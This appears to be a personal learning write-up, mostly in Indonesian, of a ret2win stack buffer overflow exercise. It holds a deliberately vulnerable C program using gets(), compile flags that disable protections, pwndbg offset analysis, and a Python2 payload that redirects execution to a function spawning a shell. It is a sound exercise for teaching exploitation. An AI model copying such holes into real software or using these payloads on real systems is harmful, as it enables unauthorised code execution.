#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
    printf("Boleh lah bolehlah jadi admin bolehlah\n");
    system('/bin/bash');
}

void danger(){
    char buff[21];
    gets(&buff);
}

int main(){
    danger();
    return 0;
}


// compile ke 32 bit
// gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin -mpreferred-stack-boundary=2 -m32 buffer3.c -o buffer3_32 -Wno-implicit-function-declaration

- main func
pwndbg> disas main
Dump of assembler code for function main:
   0x080491bb <+0>:	push   ebp
   0x080491bc <+1>:	mov    ebp,esp
   0x080491be <+3>:	call   0x80491a6 <danger>
   0x080491c3 <+8>:	mov    eax,0x0
   0x080491c8 <+13>:	pop    ebp
   0x080491c9 <+14>:	ret
End of assembler dump.
- danger func
pwndbg> disas danger
Dump of assembler code for function danger:
   0x080491a6 <+0>:	push   ebp
   0x080491a7 <+1>:	mov    ebp,esp
   0x080491a9 <+3>:	sub    esp,0x18
   0x080491ac <+6>:	lea    eax,[ebp-0x15]
   0x080491af <+9>:	push   eax
   0x080491b0 <+10>:	call   0x8049050 <gets@plt>
   0x080491b5 <+15>:	add    esp,0x4
   0x080491b8 <+18>:	nop
   0x080491b9 <+19>:	leave
   0x080491ba <+20>:	ret
End of assembler dump.
pwndbg> 
- win func
pwndbg> disas win
Dump of assembler code for function win:
   0x08049186 <+0>:	push   ebp
   0x08049187 <+1>:	mov    ebp,esp
   0x08049189 <+3>:	push   0x804a008
   0x0804918e <+8>:	call   0x8049040 <printf@plt>
   0x08049193 <+13>:	add    esp,0x4
   0x08049196 <+16>:	push   0x804a02f
   0x0804919b <+21>:	call   0x8049060 <system@plt>
   0x080491a0 <+26>:	add    esp,0x4
   0x080491a3 <+29>:	nop
   0x080491a4 <+30>:	leave
   0x080491a5 <+31>:	ret
End of assembler dump.
- yg vuln func yg ada gets() nya, pasang breakpoint di danger+6
pwndbg> break *danger+6
Breakpoint 1 at 0x80491ac
00:0000│ esp 0xffffcda8 ◂— 0 // esp
... ↓        5 skipped
06:0018│ ebp 0xffffcdc0 —▸ 0xffffcdc8 ◂— 0 // ebp
07:001c│+004 0xffffcdc4 —▸ 0x80491c3 (main+8) ◂— mov eax, 0 // ret addr
- need 25X for overflow to ret addr
- darimana 25
   0x080491a9 <+3>:	sub    esp,0x18 // 0x18 = 24 byte stack
   0x080491ac <+6>:	lea    eax,[ebp-0x15] // buff mulai di 0x15 = 21 -> start di ebp - 21: kotak ke 4 dari ebp
   // full kotak = 28, kurang 3 (karena start nya ebp (24) - 21) = 25
- payload
python2 -c "print 'A' * 25 + 'BBBB'" > pelod.txt
- debug pas run program :
pwndbg> disas danger
Dump of assembler code for function danger:
   0x080491a6 <+0>:	push   ebp
   0x080491a7 <+1>:	mov    ebp,esp
   0x080491a9 <+3>:	sub    esp,0x18
   0x080491ac <+6>:	lea    eax,[ebp-0x15]
   0x080491af <+9>:	push   eax
   0x080491b0 <+10>:	call   0x8049050 <gets@plt>
   0x080491b5 <+15>:	add    esp,0x4 // after ini
   0x080491b8 <+18>:	nop
   0x080491b9 <+19>:	leave
   0x080491ba <+20>:	ret
End of assembler dump.
pwndbg> break *danger+18
Breakpoint 1 at 0x80491b8
pwndbg> run < pelod.txt
00:0000│ esp eax-3 0xffffcda8 ◂— 0x41000000
01:0004│-014       0xffffcdac ◂— 'AAAAAAAAAAAAAAAAAAAAAAAABBBB'
... ↓              4 skipped
06:0018│ ebp       0xffffcdc0 ◂— 'AAAABBBB'
07:001c│+004       0xffffcdc4 ◂— 'BBBB' // ret addr udah di isi bbbb sekarang
- sekarangg disini 
   0x080491b8 <+18>:	nop
   0x080491b9 <+19>:	leave
- cek setelah leave
pwndbg>ni
pwndbg>ni
- top of stack nya di isi ret addr
00:0000│ esp 0xffffcdc4 ◂— 'BBBB'
01:0004│     0xffffcdc8 ◂— 0
02:0008│     0xffffcdcc —▸ 0xf7c24cc3 ◂— add esp, 0x10
03:000c│     0xffffcdd0 ◂— 1
04:0010│     0xffffcdd4 —▸ 0xffffce84 —▸ 0xffffd07c ◂— '/home/tomba/binex/buffer3_32'
05:0014│     0xffffcdd8 —▸ 0xffffce8c —▸ 0xffffd099 ◂— 'POWERSHELL_TELEMETRY_OPTOUT=1'
06:0018│     0xffffcddc —▸ 0xffffcdf0 —▸ 0xf7e32e14 ◂— 0x232d0c /* '\x0c-#' */
07:001c│     0xffffcde0 —▸ 0xf7e32e14 ◂— 0x232d0c /* '\x0c-#' */
- end let see afternya
*EIP  0x42424242 ('BBBB')
Invalid address 0x42424242 // BBBB in hex
- kalau dari ELF nya langsung sih begini :
> ./buffer3_32 < pelod.txt
[1]    20862 segmentation fault  ./buffer3_32 < pelod.txt
- ga ada addr dari itu
- conclusion: kita bisa mengontrol EIP nya: *EIP  0x42424242 ('BBBB')
- jadi kita bisa manip direct ke addr function win biar return nya ke func win()

- ambil addr dari func win
pwndbg> disas win
Dump of assembler code for function win:
   0x08049186 <+0>:	push   ebp // ini addr nya: 0x08049186
   0x08049187 <+1>:	mov    ebp,esp
   0x08049189 <+3>:	push   0x804a008
   0x0804918e <+8>:	call   0x8049040 <printf@plt>
   0x08049193 <+13>:	add    esp,0x4
   0x08049196 <+16>:	push   0x804a02f
   0x0804919b <+21>:	call   0x8049060 <system@plt>
   0x080491a0 <+26>:	add    esp,0x4
   0x080491a3 <+29>:	nop
   0x080491a4 <+30>:	leave
   0x080491a5 <+31>:	ret
End of assembler dump.
- kalau jadi little endian payload:
0x08049186 -> 08 04 91 86 -> 86 91 04 08
- susun payload:
python2 -c "print 'A' * 25 + '\x86\x91\x04\x08'" > pelod.txt
- run again in pwndbg
pwndbg> run < pelod.txt
00:0000│ esp eax-3 0xffffcda8 ◂— 0x41000000
01:0004│-014       0xffffcdac ◂— 0x41414141 ('AAAA')
... ↓              4 skipped
06:0018│ ebp       0xffffcdc0 ◂— 0x41414141 ('AAAA')
07:001c│+004       0xffffcdc4 —▸ 0x8049186 (win) ◂— push ebp // nih ret addr nya jadi si win
pwndbg>ni
pwndbg>ni
00:0000│ esp 0xffffcdc4 —▸ 0x8049186 (win) ◂— push ebp
01:0004│     0xffffcdc8 ◂— 0
02:0008│     0xffffcdcc —▸ 0xf7c24cc3 ◂— add esp, 0x10
03:000c│     0xffffcdd0 ◂— 1
04:0010│     0xffffcdd4 —▸ 0xffffce84 —▸ 0xffffd07c ◂— '/home/tomba/binex/buffer3_32'
05:0014│     0xffffcdd8 —▸ 0xffffce8c —▸ 0xffffd099 ◂— 'POWERSHELL_TELEMETRY_OPTOUT=1'
06:0018│     0xffffcddc —▸ 0xffffcdf0 —▸ 0xf7e32e14 ◂— 0x232d0c /* '\x0c-#' */
07:001c│     0xffffcde0 —▸ 0xf7e32e14 ◂— 0x232d0c /* '\x0c-#' */
pwndbg>ni
- dah di fungsi win
 ► 0 0x8049186 win
   1      0x0 None
- kalau di continue error, gabisa run di pwndbg, dari shell biasa aja
./buffer3_32 < pelod.txt
Boleh lah bolehlah jadi admin bolehlah
[1]    29612 segmentation fault  ./buffer3_32 < pelod.txt
- gabisa, harus pakai cat -
./buffer3_32 < pelod.txt; cat -
Boleh lah bolehlah jadi admin bolehlah
[1]    29265 segmentation fault  ./buffer3_32 < pelod.txt
- atau bisa gini 
(python2 -c "print 'A' * 25 + '\x86\x91\x04\x08'"; cat -) | ./buffer3_32
Boleh lah bolehlah jadi admin bolehlah
whoami
tomba



- ada cara lain biar ga nyari byte nya manual
- dulu pake pattern create [nilai bebas], dan pattern offset
- sekarang di pwndbg pakai cyclic
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> run
[paste aja output cyclic tadi]
- next dia bakalan error: 
Invalid address 0x68616161
- tinggal offset ke addr yg crash itu
pwndbg> cyclic -l 0x68616161
Finding cyclic pattern of 4 bytes: b'aaah' (hex: 0x61616168)
Found at offset 25
- ketauan 25 buffer buat ke ret addr atau EIP
- pattern gini buat kena 64bit seringnya ga worked, ke 32bit aja